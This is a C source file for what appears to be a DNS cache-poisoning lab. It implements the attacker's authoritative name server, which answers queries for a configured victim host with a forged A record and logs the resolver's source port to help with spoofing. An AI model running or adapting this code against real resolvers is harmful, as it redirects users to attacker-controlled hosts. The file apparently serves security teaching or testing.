/*
 * dns_responder.c
 *
 * Implementation of the attacker's authoritative name server behaviour.
 */

#include "dns_responder.h"
#include "lab_config.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <ldns/ldns.h>

#define DNS_MAX_PACKET_SIZE 512

int create_dns_udp_socket(void)
{
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        return -1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(DNS_PORT);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(sockfd, (const struct sockaddr *)&addr, (socklen_t)sizeof(addr)) < 0) {
        (void)close(sockfd);
        return -1;
    }
    return sockfd;
}

/* Copy the common response header bits from a query onto a fresh response. */
static void set_response_header(ldns_pkt *resp, const ldns_pkt *query)
{
    ldns_pkt_set_id(resp, ldns_pkt_id((ldns_pkt *)query));
    ldns_pkt_set_qr(resp, true);  /* response      */
    ldns_pkt_set_aa(resp, true);  /* authoritative */
    ldns_pkt_set_ra(resp, false);
    ldns_pkt_set_rcode(resp, LDNS_RCODE_NOERROR);
}

/* Clone the query's question RR into the response, if present. */
static void copy_question(ldns_pkt *resp, ldns_pkt *query)
{
    ldns_rr_list *ql = ldns_pkt_question(query);
    if (ql == NULL || ldns_rr_list_rr_count(ql) == 0U) {
        return;
    }
    ldns_rr *qrr = ldns_rr_list_rr(ql, 0U);
    ldns_rr *clone = (qrr != NULL) ? ldns_rr_clone(qrr) : NULL;
    if (clone != NULL) {
        ldns_pkt_push_rr(resp, LDNS_SECTION_QUESTION, clone);
    }
}

/* Build a poisoned A response (victim host -> VICTIM_POISON_IP). */
static ldns_pkt *build_victim_a_response(ldns_pkt *query)
{
    ldns_rr_list *ql = ldns_pkt_question(query);
    if (ql == NULL || ldns_rr_list_rr_count(ql) == 0U) {
        return NULL;
    }

    ldns_pkt *resp = ldns_pkt_new();
    if (resp == NULL) {
        return NULL;
    }
    set_response_header(resp, query);
    copy_question(resp, query);

    char a_rr_str[128];
    int n = snprintf(a_rr_str, sizeof(a_rr_str), "%s. 500 IN A %s",
                     VICTIM_HOST, VICTIM_POISON_IP);
    if (n <= 0 || (size_t)n >= sizeof(a_rr_str)) {
        ldns_pkt_free(resp);
        return NULL;
    }

    ldns_rr *a_rr = NULL;
    if (ldns_rr_new_frm_str(&a_rr, a_rr_str, 0, NULL, NULL) != LDNS_STATUS_OK) {
        if (a_rr != NULL) {
            ldns_rr_free(a_rr);
        }
        ldns_pkt_free(resp);
        return NULL;
    }
    ldns_pkt_push_rr(resp, LDNS_SECTION_ANSWER, a_rr);
    return resp;
}

/* Build an empty authoritative NOERROR response (question echoed, no answers). */
static ldns_pkt *build_empty_response(ldns_pkt *query)
{
    ldns_rr_list *ql = ldns_pkt_question(query);
    if (ql == NULL || ldns_rr_list_rr_count(ql) == 0U) {
        return NULL;
    }
    ldns_pkt *resp = ldns_pkt_new();
    if (resp == NULL) {
        return NULL;
    }
    set_response_header(resp, query);
    copy_question(resp, query);
    return resp;
}

/* Return true if the query's QNAME equals the victim host (trailing dot aware). */
static bool query_is_for_victim(ldns_pkt *query)
{
    ldns_rr_list *ql = ldns_pkt_question(query);
    if (ql == NULL || ldns_rr_list_rr_count(ql) == 0U) {
        return false;
    }
    ldns_rr *q_rr = ldns_rr_list_rr(ql, 0U);
    ldns_rdf *owner = (q_rr != NULL) ? ldns_rr_owner(q_rr) : NULL;
    if (owner == NULL) {
        return false;
    }

    char *qname = ldns_rdf2str(owner);
    if (qname == NULL) {
        return false;
    }

    /* ldns appends a trailing newline to the presentation form; strip it. */
    size_t len = strlen(qname);
    if (len > 0U && qname[len - 1U] == '\n') {
        qname[len - 1U] = '\0';
    }

    bool match = (strcmp(qname, VICTIM_HOST ".") == 0);
    free(qname);
    return match;
}

void handle_dns_query(int dns_fd, const uint8_t *data, size_t len,
                      const struct sockaddr_in *client, socklen_t client_len,
                      uint16_t *resolver_port_out)
{
    if (data == NULL || client == NULL) {
        return;
    }

    /* Record the resolver source port (host byte order). */
    if (resolver_port_out != NULL) {
        *resolver_port_out = (uint16_t)ntohs(client->sin_port);
    }

    ldns_pkt *query = NULL;
    if (ldns_wire2pkt(&query, data, len) != LDNS_STATUS_OK || query == NULL) {
        return;
    }

    ldns_pkt *response = query_is_for_victim(query)
                             ? build_victim_a_response(query)
                             : build_empty_response(query);
    if (response == NULL) {
        ldns_pkt_free(query);
        return;
    }

    uint8_t *out_wire = NULL;
    size_t out_len = 0U;
    if (ldns_pkt2wire(&out_wire, response, &out_len) == LDNS_STATUS_OK &&
        out_wire != NULL) {
        (void)sendto(dns_fd, out_wire, out_len, 0,
                     (const struct sockaddr *)client, client_len);
        free(out_wire);
    }

    ldns_pkt_free(response);
    ldns_pkt_free(query);
}

void dns_serve_forever(int dns_fd, uint16_t *resolver_port_out)
{
    uint8_t buffer[DNS_MAX_PACKET_SIZE];

    for (;;) {
        struct sockaddr_in client_addr;
        memset(&client_addr, 0, sizeof(client_addr));
        socklen_t client_len = (socklen_t)sizeof(client_addr);

        ssize_t received = recvfrom(dns_fd, buffer, sizeof(buffer), 0,
                                    (struct sockaddr *)&client_addr, &client_len);
        if (received <= 0) {
            continue; /* ignore errors and keep serving */
        }

        handle_dns_query(dns_fd, buffer, (size_t)received,
                         &client_addr, client_len, resolver_port_out);
    }
}
